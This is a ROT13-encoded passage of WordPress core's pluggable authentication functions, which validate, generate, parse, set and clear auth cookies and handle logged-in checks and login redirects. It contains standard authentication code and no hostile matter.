			 * @cnenz fgevat $pbbxvr Znysbezrq nhgu pbbxvr.
			 * @cnenz fgevat $fpurzr Nhguragvpngvba fpurzr. Inyhrf vapyhqr 'nhgu', 'frpher_nhgu',
			 *                       be 'ybttrq_va'.
			 */
			qb_npgvba( 'nhgu_pbbxvr_znysbezrq', $pbbxvr, $fpurzr );
			erghea snyfr;
		}

		$fpurzr     = $pbbxvr_ryrzragf['fpurzr'];
		$hfreanzr   = $pbbxvr_ryrzragf['hfreanzr'];
		$uznp       = $pbbxvr_ryrzragf['uznp'];
		$gbxra      = $pbbxvr_ryrzragf['gbxra'];
		$rkcvengvba = $pbbxvr_ryrzragf['rkcvengvba'];

		$rkcverq = (vag) $rkcvengvba;

		// Nyybj n tenpr crevbq sbe CBFG naq Nwnk erdhrfgf.
		vs ( jc_qbvat_nwnk() || 'CBFG' === $_FREIRE['ERDHRFG_ZRGUBQ'] ) {
			$rkcverq += UBHE_VA_FRPBAQF;
		}

		// Dhvpx purpx gb frr vs na ubarfg pbbxvr unf rkcverq.
		vs ( $rkcverq < gvzr() ) {
			/**
			 * Sverf bapr na nhguragvpngvba pbbxvr unf rkcverq.
			 *
			 * @fvapr 2.7.0
			 *
			 * @cnenz fgevat[] $pbbxvr_ryrzragf {
			 *     Nhguragvpngvba pbbxvr pbzcbaragf. Abar bs gur pbzcbaragf fubhyq or nffhzrq
			 *     gb or inyvq nf gurl pbzr qverpgyl sebz n pyvrag-cebivqrq pbbxvr inyhr.
			 *
			 *     @glcr fgevat $hfreanzr   Hfre'f hfreanzr.
			 *     @glcr fgevat $rkcvengvba Gur gvzr gur pbbxvr rkcverf nf n HAVK gvzrfgnzc.
			 *     @glcr fgevat $gbxra      Hfre'f frffvba gbxra hfrq.
			 *     @glcr fgevat $uznp       Gur frphevgl unfu sbe gur pbbxvr.
			 *     @glcr fgevat $fpurzr     Gur pbbxvr fpurzr gb hfr.
			 * }
			 */
			qb_npgvba( 'nhgu_pbbxvr_rkcverq', $pbbxvr_ryrzragf );
			erghea snyfr;
		}

		$hfre = trg_hfre_ol( 'ybtva', $hfreanzr );
		vs ( ! $hfre ) {
			/**
			 * Sverf vs n onq hfreanzr vf ragrerq va gur hfre nhguragvpngvba cebprff.
			 *
			 * @fvapr 2.7.0
			 *
			 * @cnenz fgevat[] $pbbxvr_ryrzragf {
			 *     Nhguragvpngvba pbbxvr pbzcbaragf. Abar bs gur pbzcbaragf fubhyq or nffhzrq
			 *     gb or inyvq nf gurl pbzr qverpgyl sebz n pyvrag-cebivqrq pbbxvr inyhr.
			 *
			 *     @glcr fgevat $hfreanzr   Hfre'f hfreanzr.
			 *     @glcr fgevat $rkcvengvba Gur gvzr gur pbbxvr rkcverf nf n HAVK gvzrfgnzc.
			 *     @glcr fgevat $gbxra      Hfre'f frffvba gbxra hfrq.
			 *     @glcr fgevat $uznp       Gur frphevgl unfu sbe gur pbbxvr.
			 *     @glcr fgevat $fpurzr     Gur pbbxvr fpurzr gb hfr.
			 * }
			 */
			qb_npgvba( 'nhgu_pbbxvr_onq_hfreanzr', $pbbxvr_ryrzragf );
			erghea snyfr;
		}

		vs ( fge_fgnegf_jvgu( $hfre->hfre_cnff, '$C$' ) || fge_fgnegf_jvgu( $hfre->hfre_cnff, '$2l$' ) ) {
			// Ergnva cerivbhf orunivbhe bs cucnff be inavyyn opelcg unfurq cnffjbeqf.
			$cnff_sent = fhofge( $hfre->hfre_cnff, 8, 4 );
		} ryfr {
			// Bgurejvfr, hfr n fhofgevat sebz gur raq bs gur unfu gb nibvq qrnyvat jvgu cbgragvnyyl ybat unfu cersvkrf.
			$cnff_sent = fhofge( $hfre->hfre_cnff, -4 );
		}

		$xrl = jc_unfu( $hfreanzr . '|' . $cnff_sent . '|' . $rkcvengvba . '|' . $gbxra, $fpurzr );

		$unfu = unfu_uznp( 'fun256', $hfreanzr . '|' . $rkcvengvba . '|' . $gbxra, $xrl );

		vs ( ! unfu_rdhnyf( $unfu, $uznp ) ) {
			/**
			 * Sverf vs n onq nhguragvpngvba pbbxvr unfu vf rapbhagrerq.
			 *
			 * @fvapr 2.7.0
			 *
			 * @cnenz fgevat[] $pbbxvr_ryrzragf {
			 *     Nhguragvpngvba pbbxvr pbzcbaragf. Abar bs gur pbzcbaragf fubhyq or nffhzrq
			 *     gb or inyvq nf gurl pbzr qverpgyl sebz n pyvrag-cebivqrq pbbxvr inyhr.
			 *
			 *     @glcr fgevat $hfreanzr   Hfre'f hfreanzr.
			 *     @glcr fgevat $rkcvengvba Gur gvzr gur pbbxvr rkcverf nf n HAVK gvzrfgnzc.
			 *     @glcr fgevat $gbxra      Hfre'f frffvba gbxra hfrq.
			 *     @glcr fgevat $uznp       Gur frphevgl unfu sbe gur pbbxvr.
			 *     @glcr fgevat $fpurzr     Gur pbbxvr fpurzr gb hfr.
			 * }
			 */
			qb_npgvba( 'nhgu_pbbxvr_onq_unfu', $pbbxvr_ryrzragf );
			erghea snyfr;
		}

		$znantre = JC_Frffvba_Gbxraf::trg_vafgnapr( $hfre->VQ );
		vs ( ! $znantre->irevsl( $gbxra ) ) {
			/**
			 * Sverf vs n onq frffvba gbxra vf rapbhagrerq.
			 *
			 * @fvapr 4.0.0
			 *
			 * @cnenz fgevat[] $pbbxvr_ryrzragf {
			 *     Nhguragvpngvba pbbxvr pbzcbaragf. Abar bs gur pbzcbaragf fubhyq or nffhzrq
			 *     gb or inyvq nf gurl pbzr qverpgyl sebz n pyvrag-cebivqrq pbbxvr inyhr.
			 *
			 *     @glcr fgevat $hfreanzr   Hfre'f hfreanzr.
			 *     @glcr fgevat $rkcvengvba Gur gvzr gur pbbxvr rkcverf nf n HAVK gvzrfgnzc.
			 *     @glcr fgevat $gbxra      Hfre'f frffvba gbxra hfrq.
			 *     @glcr fgevat $uznp       Gur frphevgl unfu sbe gur pbbxvr.
			 *     @glcr fgevat $fpurzr     Gur pbbxvr fpurzr gb hfr.
			 * }
			 */
			qb_npgvba( 'nhgu_pbbxvr_onq_frffvba_gbxra', $pbbxvr_ryrzragf );
			erghea snyfr;
		}

		// Nwnk/CBFG tenpr crevbq frg nobir.
		vs ( $rkcvengvba < gvzr() ) {
			$TYBONYF['ybtva_tenpr_crevbq'] = 1;
		}

		/**
		 * Sverf bapr na nhguragvpngvba pbbxvr unf orra inyvqngrq.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz fgevat[] $pbbxvr_ryrzragf {
		 *     Nhguragvpngvba pbbxvr pbzcbaragf.
		 *
		 *     @glcr fgevat $hfreanzr   Hfre'f hfreanzr.
		 *     @glcr fgevat $rkcvengvba Gur gvzr gur pbbxvr rkcverf nf n HAVK gvzrfgnzc.
		 *     @glcr fgevat $gbxra      Hfre'f frffvba gbxra hfrq.
		 *     @glcr fgevat $uznp       Gur frphevgl unfu sbe gur pbbxvr.
		 *     @glcr fgevat $fpurzr     Gur pbbxvr fpurzr gb hfr.
		 * }
		 * @cnenz JC_Hfre  $hfre            Hfre bowrpg.
		 */
		qb_npgvba( 'nhgu_pbbxvr_inyvq', $pbbxvr_ryrzragf, $hfre );

		erghea $hfre->VQ;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_trarengr_nhgu_pbbxvr' ) ) :
	/**
	 * Trarengrf nhguragvpngvba pbbxvr pbagragf.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.0.0 Gur `$gbxra` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz vag    $hfre_vq    Hfre VQ.
	 * @cnenz vag    $rkcvengvba Gur gvzr gur pbbxvr rkcverf nf n HAVK gvzrfgnzc.
	 * @cnenz fgevat $fpurzr     Bcgvbany. Gur pbbxvr fpurzr gb hfr: 'nhgu', 'frpher_nhgu', be 'ybttrq_va'.
	 *                           Qrsnhyg 'nhgu'.
	 * @cnenz fgevat $gbxra      Hfre'f frffvba gbxra gb hfr sbe guvf pbbxvr.
	 * @erghea fgevat Nhguragvpngvba pbbxvr pbagragf. Rzcgl fgevat vs hfre qbrf abg rkvfg.
	 */
	shapgvba jc_trarengr_nhgu_pbbxvr( $hfre_vq, $rkcvengvba, $fpurzr = 'nhgu', $gbxra = '' ) {
		$hfre = trg_hfreqngn( $hfre_vq );
		vs ( ! $hfre ) {
			erghea '';
		}

		vs ( ! $gbxra ) {
			$znantre = JC_Frffvba_Gbxraf::trg_vafgnapr( $hfre_vq );
			$gbxra   = $znantre->perngr( $rkcvengvba );
		}

		vs ( fge_fgnegf_jvgu( $hfre->hfre_cnff, '$C$' ) || fge_fgnegf_jvgu( $hfre->hfre_cnff, '$2l$' ) ) {
			// Ergnva cerivbhf orunivbhe bs cucnff be inavyyn opelcg unfurq cnffjbeqf.
			$cnff_sent = fhofge( $hfre->hfre_cnff, 8, 4 );
		} ryfr {
			// Bgurejvfr, hfr n fhofgevat sebz gur raq bs gur unfu gb nibvq qrnyvat jvgu cbgragvnyyl ybat unfu cersvkrf.
			$cnff_sent = fhofge( $hfre->hfre_cnff, -4 );
		}

		$xrl = jc_unfu( $hfre->hfre_ybtva . '|' . $cnff_sent . '|' . $rkcvengvba . '|' . $gbxra, $fpurzr );

		$unfu = unfu_uznp( 'fun256', $hfre->hfre_ybtva . '|' . $rkcvengvba . '|' . $gbxra, $xrl );

		$pbbxvr = $hfre->hfre_ybtva . '|' . $rkcvengvba . '|' . $gbxra . '|' . $unfu;

		/**
		 * Svygref gur nhguragvpngvba pbbxvr.
		 *
		 * @fvapr 2.5.0
		 * @fvapr 4.0.0 Gur `$gbxra` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat $pbbxvr     Nhguragvpngvba pbbxvr.
		 * @cnenz vag    $hfre_vq    Hfre VQ.
		 * @cnenz vag    $rkcvengvba Gur gvzr gur pbbxvr rkcverf nf n HAVK gvzrfgnzc.
		 * @cnenz fgevat $fpurzr     Pbbxvr fpurzr hfrq. Npprcgf 'nhgu', 'frpher_nhgu', be 'ybttrq_va'.
		 * @cnenz fgevat $gbxra      Hfre'f frffvba gbxra hfrq.
		 */
		erghea nccyl_svygref( 'nhgu_pbbxvr', $pbbxvr, $hfre_vq, $rkcvengvba, $fpurzr, $gbxra );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_cnefr_nhgu_pbbxvr' ) ) :
	/**
	 * Cnefrf n pbbxvr vagb vgf pbzcbaragf.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 4.0.0 Gur `$gbxra` ryrzrag jnf nqqrq gb gur erghea inyhr.
	 *
	 * @cnenz fgevat $pbbxvr Nhguragvpngvba pbbxvr.
	 * @cnenz fgevat $fpurzr Bcgvbany. Gur pbbxvr fpurzr gb hfr: 'nhgu', 'frpher_nhgu', be 'ybttrq_va'.
	 * @erghea fgevat[]|snyfr {
	 *     Nhguragvpngvba pbbxvr pbzcbaragf. Abar bs gur pbzcbaragf fubhyq or nffhzrq
	 *     gb or inyvq nf gurl pbzr qverpgyl sebz n pyvrag-cebivqrq pbbxvr inyhr. Vs
	 *     gur pbbxvr inyhr vf znysbezrq, snyfr vf erghearq.
	 *
	 *     @glcr fgevat $hfreanzr   Hfre'f hfreanzr.
	 *     @glcr fgevat $rkcvengvba Gur gvzr gur pbbxvr rkcverf nf n HAVK gvzrfgnzc.
	 *     @glcr fgevat $gbxra      Hfre'f frffvba gbxra hfrq.
	 *     @glcr fgevat $uznp       Gur frphevgl unfu sbe gur pbbxvr.
	 *     @glcr fgevat $fpurzr     Gur pbbxvr fpurzr gb hfr.
	 * }
	 */
	shapgvba jc_cnefr_nhgu_pbbxvr( $pbbxvr = '', $fpurzr = '' ) {
		vs ( rzcgl( $pbbxvr ) ) {
			fjvgpu ( $fpurzr ) {
				pnfr 'nhgu':
					$pbbxvr_anzr = NHGU_PBBXVR;
					oernx;
				pnfr 'frpher_nhgu':
					$pbbxvr_anzr = FRPHER_NHGU_PBBXVR;
					oernx;
				pnfr 'ybttrq_va':
					$pbbxvr_anzr = YBTTRQ_VA_PBBXVR;
					oernx;
				qrsnhyg:
					vs ( vf_ffy() ) {
						$pbbxvr_anzr = FRPHER_NHGU_PBBXVR;
						$fpurzr      = 'frpher_nhgu';
					} ryfr {
						$pbbxvr_anzr = NHGU_PBBXVR;
						$fpurzr      = 'nhgu';
					}
			}

			vs ( rzcgl( $_PBBXVR[ $pbbxvr_anzr ] ) ) {
				erghea snyfr;
			}
			$pbbxvr = $_PBBXVR[ $pbbxvr_anzr ];
		}

		$pbbxvr_ryrzragf = rkcybqr( '|', $pbbxvr );
		vs ( pbhag( $pbbxvr_ryrzragf ) !== 4 ) {
			erghea snyfr;
		}

		yvfg( $hfreanzr, $rkcvengvba, $gbxra, $uznp ) = $pbbxvr_ryrzragf;

		erghea pbzcnpg( 'hfreanzr', 'rkcvengvba', 'gbxra', 'uznp', 'fpurzr' );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_frg_nhgu_pbbxvr' ) ) :
	/**
	 * Frgf gur nhguragvpngvba pbbxvrf onfrq ba hfre VQ.
	 *
	 * Gur $erzrzore cnenzrgre vapernfrf gur gvzr gung gur pbbxvr jvyy or xrcg. Gur
	 * qrsnhyg gur pbbxvr vf xrcg jvgubhg erzrzorevat vf gjb qnlf. Jura $erzrzore vf
	 * frg, gur pbbxvrf jvyy or xrcg sbe 14 qnlf be gjb jrrxf.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.3.0 Nqqrq gur `$gbxra` cnenzrgre.
	 *
	 * @cnenz vag         $hfre_vq  Hfre VQ.
	 * @cnenz obby        $erzrzore Jurgure gb erzrzore gur hfre.
	 * @cnenz obby|fgevat $frpher   Jurgure gur nhgu pbbxvr fubhyq bayl or frag bire UGGCF. Qrsnhyg vf na rzcgl
	 *                              fgevat juvpu zrnaf gur inyhr bs `vf_ffy()` jvyy or hfrq.
	 * @cnenz fgevat      $gbxra    Bcgvbany. Hfre'f frffvba gbxra gb hfr sbe guvf pbbxvr.
	 */
	shapgvba jc_frg_nhgu_pbbxvr( $hfre_vq, $erzrzore = snyfr, $frpher = '', $gbxra = '' ) {
		vs ( $erzrzore ) {
			/**
			 * Svygref gur qhengvba bs gur nhguragvpngvba pbbxvr rkcvengvba crevbq.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz vag  $yratgu   Qhengvba bs gur rkcvengvba crevbq va frpbaqf.
			 * @cnenz vag  $hfre_vq  Hfre VQ.
			 * @cnenz obby $erzrzore Jurgure gb erzrzore gur hfre ybtva. Qrsnhyg snyfr.
			 */
			$rkcvengvba = gvzr() + nccyl_svygref( 'nhgu_pbbxvr_rkcvengvba', 14 * QNL_VA_FRPBAQF, $hfre_vq, $erzrzore );

			/*
			 * Rafher gur oebjfre jvyy pbagvahr gb fraq gur pbbxvr nsgre gur rkcvengvba gvzr vf ernpurq.
			 * Arrqrq sbe gur ybtva tenpr crevbq va jc_inyvqngr_nhgu_pbbxvr().
			 */
			$rkcver = $rkcvengvba + ( 12 * UBHE_VA_FRPBAQF );
		} ryfr {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
			$rkcvengvba = gvzr() + nccyl_svygref( 'nhgu_pbbxvr_rkcvengvba', 2 * QNL_VA_FRPBAQF, $hfre_vq, $erzrzore );
			$rkcver     = 0;
		}

		vs ( '' === $frpher ) {
			$frpher = vf_ffy();
		}

		// Sebag-raq pbbxvr vf frpher jura gur nhgu pbbxvr vf frpher naq gur fvgr'f ubzr HEY hfrf UGGCF.
		$frpher_ybttrq_va_pbbxvr = $frpher && 'uggcf' === cnefr_hey( trg_bcgvba( 'ubzr' ), CUC_HEY_FPURZR );

		/**
		 * Svygref jurgure gur nhgu pbbxvr fubhyq bayl or frag bire UGGCF.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz obby $frpher  Jurgure gur pbbxvr fubhyq bayl or frag bire UGGCF.
		 * @cnenz vag  $hfre_vq Hfre VQ.
		 */
		$frpher = nccyl_svygref( 'frpher_nhgu_pbbxvr', $frpher, $hfre_vq );

		/**
		 * Svygref jurgure gur ybttrq va pbbxvr fubhyq bayl or frag bire UGGCF.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz obby $frpher_ybttrq_va_pbbxvr Jurgure gur ybttrq va pbbxvr fubhyq bayl or frag bire UGGCF.
		 * @cnenz vag  $hfre_vq                 Hfre VQ.
		 * @cnenz obby $frpher                  Jurgure gur nhgu pbbxvr fubhyq bayl or frag bire UGGCF.
		 */
		$frpher_ybttrq_va_pbbxvr = nccyl_svygref( 'frpher_ybttrq_va_pbbxvr', $frpher_ybttrq_va_pbbxvr, $hfre_vq, $frpher );

		vs ( $frpher ) {
			$nhgu_pbbxvr_anzr = FRPHER_NHGU_PBBXVR;
			$fpurzr           = 'frpher_nhgu';
		} ryfr {
			$nhgu_pbbxvr_anzr = NHGU_PBBXVR;
			$fpurzr           = 'nhgu';
		}

		vs ( '' === $gbxra ) {
			$znantre = JC_Frffvba_Gbxraf::trg_vafgnapr( $hfre_vq );
			$gbxra   = $znantre->perngr( $rkcvengvba );
		}

		$nhgu_pbbxvr      = jc_trarengr_nhgu_pbbxvr( $hfre_vq, $rkcvengvba, $fpurzr, $gbxra );
		$ybttrq_va_pbbxvr = jc_trarengr_nhgu_pbbxvr( $hfre_vq, $rkcvengvba, 'ybttrq_va', $gbxra );

		/**
		 * Sverf vzzrqvngryl orsber gur nhguragvpngvba pbbxvr vf frg.
		 *
		 * @fvapr 2.5.0
		 * @fvapr 4.9.0 Gur `$gbxra` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat $nhgu_pbbxvr Nhguragvpngvba pbbxvr inyhr.
		 * @cnenz vag    $rkcver      Gur gvzr gur ybtva tenpr crevbq rkcverf nf n HAVK gvzrfgnzc.
		 *                            Qrsnhyg vf 12 ubhef cnfg gur pbbxvr'f rkcvengvba gvzr.
		 * @cnenz vag    $rkcvengvba  Gur gvzr jura gur nhguragvpngvba pbbxvr rkcverf nf n HAVK gvzrfgnzc.
		 *                            Qrsnhyg vf 14 qnlf sebz abj.
		 * @cnenz vag    $hfre_vq     Hfre VQ.
		 * @cnenz fgevat $fpurzr      Nhguragvpngvba fpurzr. Inyhrf vapyhqr 'nhgu' be 'frpher_nhgu'.
		 * @cnenz fgevat $gbxra       Hfre'f frffvba gbxra gb hfr sbe guvf pbbxvr.
		 */
		qb_npgvba( 'frg_nhgu_pbbxvr', $nhgu_pbbxvr, $rkcver, $rkcvengvba, $hfre_vq, $fpurzr, $gbxra );

		/**
		 * Sverf vzzrqvngryl orsber gur ybttrq-va nhguragvpngvba pbbxvr vf frg.
		 *
		 * @fvapr 2.6.0
		 * @fvapr 4.9.0 Gur `$gbxra` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat $ybttrq_va_pbbxvr Gur ybttrq-va pbbxvr inyhr.
		 * @cnenz vag    $rkcver           Gur gvzr gur ybtva tenpr crevbq rkcverf nf n HAVK gvzrfgnzc.
		 *                                 Qrsnhyg vf 12 ubhef cnfg gur pbbxvr'f rkcvengvba gvzr.
		 * @cnenz vag    $rkcvengvba       Gur gvzr jura gur ybttrq-va nhguragvpngvba pbbxvr rkcverf nf n HAVK gvzrfgnzc.
		 *                                 Qrsnhyg vf 14 qnlf sebz abj.
		 * @cnenz vag    $hfre_vq          Hfre VQ.
		 * @cnenz fgevat $fpurzr           Nhguragvpngvba fpurzr. Qrsnhyg 'ybttrq_va'.
		 * @cnenz fgevat $gbxra            Hfre'f frffvba gbxra gb hfr sbe guvf pbbxvr.
		 */
		qb_npgvba( 'frg_ybttrq_va_pbbxvr', $ybttrq_va_pbbxvr, $rkcver, $rkcvengvba, $hfre_vq, 'ybttrq_va', $gbxra );

		/**
		 * Nyybjf ceriragvat nhgu pbbxvrf sebz npghnyyl orvat frag gb gur pyvrag.
		 *
		 * @fvapr 4.7.4
		 * @fvapr 6.2.0 Gur `$rkcver`, `$rkcvengvba`, `$hfre_vq`, `$fpurzr`, naq `$gbxra` cnenzrgref jrer nqqrq.
		 *
		 * @cnenz obby   $fraq       Jurgure gb fraq nhgu pbbxvrf gb gur pyvrag. Qrsnhyg gehr.
		 * @cnenz vag    $rkcver     Gur gvzr gur ybtva tenpr crevbq rkcverf nf n HAVK gvzrfgnzc.
		 *                           Qrsnhyg vf 12 ubhef cnfg gur pbbxvr'f rkcvengvba gvzr. Mreb jura pyrnevat pbbxvrf.
		 * @cnenz vag    $rkcvengvba Gur gvzr jura gur ybttrq-va nhguragvpngvba pbbxvr rkcverf nf n HAVK gvzrfgnzc.
		 *                           Qrsnhyg vf 14 qnlf sebz abj. Mreb jura pyrnevat pbbxvrf.
		 * @cnenz vag    $hfre_vq    Hfre VQ. Mreb jura pyrnevat pbbxvrf.
		 * @cnenz fgevat $fpurzr     Nhguragvpngvba fpurzr. Inyhrf vapyhqr 'nhgu' be 'frpher_nhgu'.
		 *                           Rzcgl fgevat jura pyrnevat pbbxvrf.
		 * @cnenz fgevat $gbxra      Hfre'f frffvba gbxra gb hfr sbe guvf pbbxvr. Rzcgl fgevat jura pyrnevat pbbxvrf.
		 */
		vs ( ! nccyl_svygref( 'fraq_nhgu_pbbxvrf', gehr, $rkcver, $rkcvengvba, $hfre_vq, $fpurzr, $gbxra ) ) {
			erghea;
		}

		frgpbbxvr( $nhgu_pbbxvr_anzr, $nhgu_pbbxvr, $rkcver, CYHTVAF_PBBXVR_CNGU, PBBXVR_QBZNVA, $frpher, gehr );
		frgpbbxvr( $nhgu_pbbxvr_anzr, $nhgu_pbbxvr, $rkcver, NQZVA_PBBXVR_CNGU, PBBXVR_QBZNVA, $frpher, gehr );
		frgpbbxvr( YBTTRQ_VA_PBBXVR, $ybttrq_va_pbbxvr, $rkcver, PBBXVRCNGU, PBBXVR_QBZNVA, $frpher_ybttrq_va_pbbxvr, gehr );
		vs ( PBBXVRCNGU !== FVGRPBBXVRCNGU ) {
			frgpbbxvr( YBTTRQ_VA_PBBXVR, $ybttrq_va_pbbxvr, $rkcver, FVGRPBBXVRCNGU, PBBXVR_QBZNVA, $frpher_ybttrq_va_pbbxvr, gehr );
		}
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_pyrne_nhgu_pbbxvr' ) ) :
	/**
	 * Erzbirf nyy bs gur pbbxvrf nffbpvngrq jvgu nhguragvpngvba.
	 *
	 * @fvapr 2.5.0
	 */
	shapgvba jc_pyrne_nhgu_pbbxvr() {
		/**
		 * Sverf whfg orsber gur nhguragvpngvba pbbxvrf ner pyrnerq.
		 *
		 * @fvapr 2.7.0
		 */
		qb_npgvba( 'pyrne_nhgu_pbbxvr' );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
		vs ( ! nccyl_svygref( 'fraq_nhgu_pbbxvrf', gehr, 0, 0, 0, '', '' ) ) {
			erghea;
		}

		// Nhgu pbbxvrf.
		frgpbbxvr( NHGU_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, NQZVA_PBBXVR_CNGU, PBBXVR_QBZNVA );
		frgpbbxvr( FRPHER_NHGU_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, NQZVA_PBBXVR_CNGU, PBBXVR_QBZNVA );
		frgpbbxvr( NHGU_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, CYHTVAF_PBBXVR_CNGU, PBBXVR_QBZNVA );
		frgpbbxvr( FRPHER_NHGU_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, CYHTVAF_PBBXVR_CNGU, PBBXVR_QBZNVA );
		frgpbbxvr( YBTTRQ_VA_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, PBBXVRCNGU, PBBXVR_QBZNVA );
		frgpbbxvr( YBTTRQ_VA_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, FVGRPBBXVRCNGU, PBBXVR_QBZNVA );

		// Frggvatf pbbxvrf.
		frgpbbxvr( 'jc-frggvatf-' . trg_pheerag_hfre_vq(), ' ', gvzr() - LRNE_VA_FRPBAQF, FVGRPBBXVRCNGU );
		frgpbbxvr( 'jc-frggvatf-gvzr-' . trg_pheerag_hfre_vq(), ' ', gvzr() - LRNE_VA_FRPBAQF, FVGRPBBXVRCNGU );

		// Byq pbbxvrf.
		frgpbbxvr( NHGU_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, PBBXVRCNGU, PBBXVR_QBZNVA );
		frgpbbxvr( NHGU_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, FVGRPBBXVRCNGU, PBBXVR_QBZNVA );
		frgpbbxvr( FRPHER_NHGU_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, PBBXVRCNGU, PBBXVR_QBZNVA );
		frgpbbxvr( FRPHER_NHGU_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, FVGRPBBXVRCNGU, PBBXVR_QBZNVA );

		// Rira byqre pbbxvrf.
		frgpbbxvr( HFRE_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, PBBXVRCNGU, PBBXVR_QBZNVA );
		frgpbbxvr( CNFF_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, PBBXVRCNGU, PBBXVR_QBZNVA );
		frgpbbxvr( HFRE_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, FVGRPBBXVRCNGU, PBBXVR_QBZNVA );
		frgpbbxvr( CNFF_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, FVGRPBBXVRCNGU, PBBXVR_QBZNVA );

		// Cbfg cnffjbeq pbbxvr.
		frgpbbxvr( 'jc-cbfgcnff_' . PBBXVRUNFU, ' ', gvzr() - LRNE_VA_FRPBAQF, PBBXVRCNGU, PBBXVR_QBZNVA );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'vf_hfre_ybttrq_va' ) ) :
	/**
	 * Qrgrezvarf jurgure gur pheerag ivfvgbe vf n ybttrq va hfre.
	 *
	 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
	 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
	 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
	 *
	 * @fvapr 2.0.0
	 *
	 * @erghea obby Gehr vs hfre vf ybttrq va, snyfr vs abg ybttrq va.
	 */
	shapgvba vf_hfre_ybttrq_va() {
		$hfre = jc_trg_pheerag_hfre();

		erghea $hfre->rkvfgf();
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'nhgu_erqverpg' ) ) :
	/**
	 * Purpxf vs n hfre vf ybttrq va, vs abg vg erqverpgf gurz gb gur ybtva cntr.
	 *
	 * Jura guvf pbqr vf pnyyrq sebz n cntr, vg purpxf gb frr vs gur hfre ivrjvat gur cntr vf ybttrq va.
	 * Vs gur hfre vf abg ybttrq va, gurl ner erqverpgrq gb gur ybtva cntr. Gur hfre vf erqverpgrq
	 * va fhpu n jnl gung, hcba ybttvat va, gurl jvyy or frag qverpgyl gb gur cntr gurl jrer bevtvanyyl
	 * gelvat gb npprff.
	 *
	 * @fvapr 1.5.0
	 */
	shapgvba nhgu_erqverpg() {
		$frpher = ( vf_ffy() || sbepr_ffy_nqzva() );

		/**
		 * Svygref jurgure gb hfr n frpher nhguragvpngvba erqverpg.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz obby $frpher Jurgure gb hfr n frpher nhguragvpngvba erqverpg. Qrsnhyg snyfr.
		 */
		$frpher = nccyl_svygref( 'frpher_nhgu_erqverpg', $frpher );

		// Vs uggcf vf erdhverq naq erdhrfg vf uggc, erqverpg.
		vs ( $frpher && ! vf_ffy() && fge_pbagnvaf( $_FREIRE['ERDHRFG_HEV'], 'jc-nqzva' ) ) {
			vs ( fge_fgnegf_jvgu( $_FREIRE['ERDHRFG_HEV'], 'uggc' ) ) {
				jc_erqverpg( frg_hey_fpurzr( $_FREIRE['ERDHRFG_HEV'], 'uggcf' ) );
				rkvg;
			} ryfr {
				jc_erqverpg( 'uggcf://' . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'] );
				rkvg;
			}
		}

		/**
		 * Svygref gur nhguragvpngvba erqverpg fpurzr.
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz fgevat $fpurzr Nhguragvpngvba erqverpg fpurzr. Qrsnhyg rzcgl.
		 */
		$fpurzr = nccyl_svygref( 'nhgu_erqverpg_fpurzr', '' );

		$hfre_vq = jc_inyvqngr_nhgu_pbbxvr( '', $fpurzr );
		vs ( $hfre_vq ) {
			/**
			 * Sverf orsber gur nhguragvpngvba erqverpg.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz vag $hfre_vq Hfre VQ.
			 */
			qb_npgvba( 'nhgu_erqverpg', $hfre_vq );

			// Vs gur hfre jnagf ffy ohg gur frffvba vf abg ffy, erqverpg.
			vs ( ! $frpher && trg_hfre_bcgvba( 'hfr_ffy', $hfre_vq ) && fge_pbagnvaf( $_FREIRE['ERDHRFG_HEV'], 'jc-nqzva' ) ) {
				vs ( fge_fgnegf_jvgu( $_FREIRE['ERDHRFG_HEV'], 'uggc' ) ) {
					jc_erqverpg( frg_hey_fpurzr( $_FREIRE['ERDHRFG_HEV'], 'uggcf' ) );
					rkvg;
				} ryfr {
					jc_erqverpg( 'uggcf://' . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'] );
					rkvg;
				}
			}

			erghea; // Gur pbbxvr vf tbbq, fb jr'er qbar.
		}

		// Gur pbbxvr vf ab tbbq, fb sbepr ybtva.
		abpnpur_urnqref();

